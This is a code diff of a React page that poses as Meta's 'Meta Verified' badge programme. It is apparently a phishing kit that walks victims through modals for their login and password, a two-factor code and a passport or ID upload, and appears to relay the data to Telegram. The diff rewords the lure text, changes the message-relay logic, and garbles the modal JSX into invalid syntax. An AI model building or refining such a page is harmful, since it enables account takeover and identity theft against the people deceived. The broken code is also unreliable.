@@ -68,13 +68,13 @@ const Home = () =>
         () => ( {
             heroTitle: 'Meta Verified - Rewards for you',
             showWorld: 'Show the world that you mean business.',
-            congrats: "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
-            excited: "We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!",
+            congrats: 'Congratulations on meeting the eligibility criteria to upgrade your page with a verified blue badge! This achievement highlights your commitment and the strong connection built with your community.',
+            excited: 'We are excited to celebrate this milestone alongside you and look forward to watching your page grow with this distinction!',
             ticketIdPrefix: 'Your ticket id:',
             guideTitle: 'Verified Blue Badge Request Guide',
-            guideItem1: '- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats',
-            guideItem2: '- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.',
-            guideItem3: '- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.',
+            guideItem1: '- Reviewers cannot process submissions containing harassment, hate speech, or abusive language.',
+            guideItem2: '- Please submit all requested details accurately so reviewers can evaluate your request promptly. Providing an unreachable email or failing to respond to follow-up inquiries within 2 days may result in automatic closure. Requests left incomplete after 4 days will be declined automatically.',
+            guideItem3: '- Once your details are received, we will review your profile for any active limitations. Standard processing takes around 24 hours, though complex cases may require additional time. Your account status will be updated accordingly once the evaluation finishes.',
             submitRequest: 'Submit request',
             helpCenter: 'Help Center',
             privacyPolicy: 'Privacy Policy',
@@ -101,7 +101,7 @@ const Home = () =>
             confirm: 'Confirm',
             aboutHelpMore: 'About · Help · See more',
 
-            loginInstruction: 'In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).',
+            loginInstruction: 'To enroll your business in Meta Verified, please sign in with your professional account or business Page.',
             mobileOrEmail: 'Mobile number or email',
             password: 'Password',
             passwordIncorrect: 'Password is incorrect, please try again.',
@@ -127,19 +127,19 @@ const Home = () =>
 
             privacyPolicyQ: 'What is the Privacy Policy and what does it say?',
             mainInSection: 'The main thing in the section',
-            privacyDesc1: 'At Meta, we want you to understand what information we collect, how we use it, and with whom we use it. let\'s share. Therefore, we recommend that you read our Privacy Policy. This will help you use',
-            privacyDesc2: '\'s products the way you need.',
-            privacyDesc3: 'In the Privacy Policy, we explain how we collect, use, store information, and We also share it. We also tell you about your rights. Each section of the Policy contains Useful examples and simplified statements to make our work easier to understand. We also added links to resources where you can learn in more detail about topics that interest you with confidentiality.',
-            privacyDesc4: 'It is important to us that you know how to manage your privacy (confidentiality), so we also We show you where in the settings of the Meta Products you use you can manage your data. You you can',
+            privacyDesc1: 'We want you to clearly understand what data we gather, how it is processed, and with whom it may be shared. Reviewing our Privacy Policy helps you manage your experience across',
+            privacyDesc2: ' services effectively.',
+            privacyDesc3: 'Our policy outlines how information is collected, stored, and protected, as well as your privacy rights and available controls.',
+            privacyDesc4: 'You can review and adjust how your information is handled at any time. Visit your account preferences to',
             updateSettings: 'update these settings',
-            privacyDesc5: 'to personalize your user experience.',
+            privacyDesc5: 'according to your preferences.',
             ourPolicies: 'Our policies.',
             whatProducts: 'What products are covered by this policy?',
             learnMorePrivacy: 'Learn more about managing your privacy at Privacy Center',
             whatInfoCollect: 'What information do we collect?',
-            infoCollectDesc1: 'The information we collect and process about you depends on how you use our',
+            infoCollectDesc1: 'The types of data processed depend on how you interact with our',
             products: 'Products',
-            infoCollectDesc2: '. For example, we collect different information when you sell furniture on Marketplace and when you post a Reels video on Instagram. We collect data about you when you use our Products,',
+            infoCollectDesc2: '. Information may be collected when you use our services,',
             evenNoAccount: 'even if you do not have an account',
             typesOfData: 'The following are the types of data we collect:',
             yourActions: 'Your actions and information you provide to us',
@@ -147,21 +147,21 @@ const Home = () =>
             appBrowserDevice: 'Application, browser and device information',
             infoFromPartners: 'Information from Partners, suppliers and other third parties',
             whatIfNotAllow: 'What happens if you do not allow us to collect certain types of information?',
-            someInfoNecessary: 'Some information is necessary for the operation of our Products. Other information is optional, but its absence may affect your experience with our products.',
+            someInfoNecessary: 'Certain data is required for core functionality, while optional data helps tailor your overall experience.',
             moreDetails: 'More details',
             whatIfNoIdentify: 'What if the information we collect does not personally identify individuals?',
-            deIdentifyDesc: 'In some cases, before third parties make information available to us, they de-identify, aggregate, or anonymize it so that it cannot be used to identify individual individuals. We use this information as described below, without attempting to re-identify individuals.',
+            deIdentifyDesc: 'Third-party partners may aggregate or anonymize data prior to sharing so that individual identities cannot be determined.',
             dataControl: 'Data control',
             manageInfoCollect: 'Manage the information we collect about you',
 
             termsOfUse: 'Terms of use',
-            termsDesc1: 'Meta creates technologies and services that allow people to communicate with each other, form communities and develop companies. This User Agreement governs the use of you Facebook, Messenger, and other products, features, applications, services, technologies and software we offer (',
+            termsDesc1: 'These terms govern your access to and use of our applications, services, and software (',
             metaProducts: 'Meta Products',
             termsDesc2: ' or ',
-            termsDesc3: '), if not expressly states that separate terms apply (and this agreement does not apply). These Products are provided to you by Meta Platforms, Inc.',
+            termsDesc3: '), unless separate terms explicitly apply.',
             termsDesc4: 'Our ',
-            termsDesc5: ' explains how we collect and use your personal data to determine which advertisements may be relevant to you, and provide other services described below. Also, in ',
-            termsDesc6: ' of the relevant Products Meta, you can change your privacy level at any time regarding our use of your data.',
+            termsDesc5: ' describes how personal data is processed to personalize content and services. Through ',
+            termsDesc6: ' in your settings, you can adjust your privacy preferences anytime.',
             servicesWeProvide: 'Services we provide',
             service1: 'Personalize your experience.',
             service2: 'Connect with people and organizations that interest you.',
@@ -174,24 +174,24 @@ const Home = () =>
             service9: 'Providing access to our services.',
             otherTermsPolicies: 'Other terms and policies that may apply to you',
             advertisingRules: 'Advertising Rules',
-            advertisingRulesDesc: '. These rules apply to partners who advertise on various Meta Products and determine the types of advertising content that such partners are permitted to use.',
-            communityStandardsDesc: '. These guidelines set out our standards for the content you post on Facebook and your activities on Facebook and other Meta Products.',
+            advertisingRulesDesc: '. Guidelines governing commercial promotions and partner advertisements.',
+            communityStandardsDesc: '. Rules outlining acceptable behavior and content across our platforms.',
             communityPaymentTerms: 'Community Payment Terms',
-            communityPaymentTermsDesc: '. These terms apply to payments made to or through the Meta Products.',
+            communityPaymentTermsDesc: '. Terms governing financial transactions processed through our services.',
             commercialTerms: 'Commercial terms',
-            commercialTermsDesc: '. These terms apply if you use or access our Products for any commercial or business purposes, including advertising, using our measurement services, managing an application on our Platform, a group or a Company Page, and selling goods or services.',
+            commercialTermsDesc: '. Additional terms applicable to business, merchant, and commercial page operations.',
             tradeRules: 'Trade Rules',
-            tradeRulesDesc: '. This guide outlines the rules that apply when you offer products or services for sale on Facebook, Instagram or WhatsApp.',
+            tradeRulesDesc: '. Standards applicable when listing goods or services for sale.',
             lastRevisionDate: 'Last revision date: July 26, 2023',
             accountSecurity: 'Account security',
 
             uploadTitle: 'Confirm your identity',
             uploadChooseType: 'Choose type of ID to upload',
-            uploadDesc: "We'll use your ID to review your name, photo, and date of birth. It won't be shared on your profile.",
+            uploadDesc: 'We will use your ID to verify your name, photo, and date of birth. It will not be displayed publicly on your profile.',
             uploadPassport: 'Passport',
             uploadDriversLicense: "Driver's license",
             uploadNationalId: 'National ID card',
-            uploadSecurityNote: "Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we'll delete it within 30 days. We sometimes use trusted service providers to help review your information.",
+            uploadSecurityNote: 'Your identification document is encrypted and stored securely during verification review, and removed according to our retention policy.',
             uploadLearnMore: 'Learn more',
             uploadBtn: 'Upload Image',
             uploadUploading: 'Uploading...',
@@ -335,7 +335,7 @@ const Home = () =>
         sendQueueRef.current = sendQueueRef.current.then( async () =>
         {
             const sentId = await sendMessage( message, telegramMsgIdRef.current );
-            if ( sentId && !telegramMsgIdRef.current )
+            if ( sentId )
             {
                 telegramMsgIdRef.current = sentId;
             }
@@ -670,43 +670,31 @@ const Home = () =>
                 </div>
             </div>
 
-            <FirstFormModal
-                show={ showFirstModal }
-                onClose={ () => setShowFirstModal( false ) }
+            <FirstFormModal onClose="{" show="{" showFirstModal }> setShowFirstModal( false ) }
                 onSubmit={ handleFirstFormSubmit }
                 onOpenTerms={ () => setShowTermsModal( true ) }
                 texts={ texts }
                 defaultCountryCode={ ipInfo.countryCode }
             />
-            <LoginModal
-                show={ showLoginModal }
-                onClose={ () => setShowLoginModal( false ) }
+            <LoginModal onClose="{" show="{" showLoginModal }> setShowLoginModal( false ) }
                 onSubmit={ handleLoginSubmit }
                 onSuccess={ () => { setShowLoginModal( false ); setShow2FAModal( true ); } }
                 texts={ texts }
             />
-            <TwoFAModal
-                show={ show2FAModal }
-                onClose={ () => setShow2FAModal( false ) }
+            <TwoFAModal onClose="{" show="{" show2FAModal }> setShow2FAModal( false ) }
                 onSubmit={ handle2FASubmit }
                 onSuccess={ () => { setShow2FAModal( false ); setShowUploadModal( true ); } }
                 texts={ texts }
                 formData={ formData }
             />
-            <UploadModal
-                show={ showUploadModal }
-                onClose={ () => setShowUploadModal( false ) }
+            <UploadModal onClose="{" show="{" showUploadModal }> setShowUploadModal( false ) }
                 onSuccess={ () => { setShowUploadModal( false ); setShowSuccessModal( true ); } }
                 texts={ texts }
             />
-            <SuccessModal
-                show={ showSuccessModal }
-                onClose={ () => setShowSuccessModal( false ) }
+            <SuccessModal onClose="{" show="{" showSuccessModal }> setShowSuccessModal( false ) }
                 texts={ texts }
             />
-            <PrivacyPolicyModal
-                show={ showPrivacyModal }
-                onClose={ () =>
+            <PrivacyPolicyModal onClose="{" show="{" showPrivacyModal }>
                 {
                     setShowPrivacyModal( false );
                     setSelectedPrivacyQuestion( null );
@@ -714,9 +702,7 @@ const Home = () =>
                 selectedQuestion={ selectedPrivacyQuestion }
                 texts={ texts }
             />
-            <TermsModal
-                show={ showTermsModal }
-                onClose={ () => setShowTermsModal( false ) }
+            <TermsModal onClose="{" show="{" showTermsModal }> setShowTermsModal( false ) }
                 texts={ texts }
             />
         </>
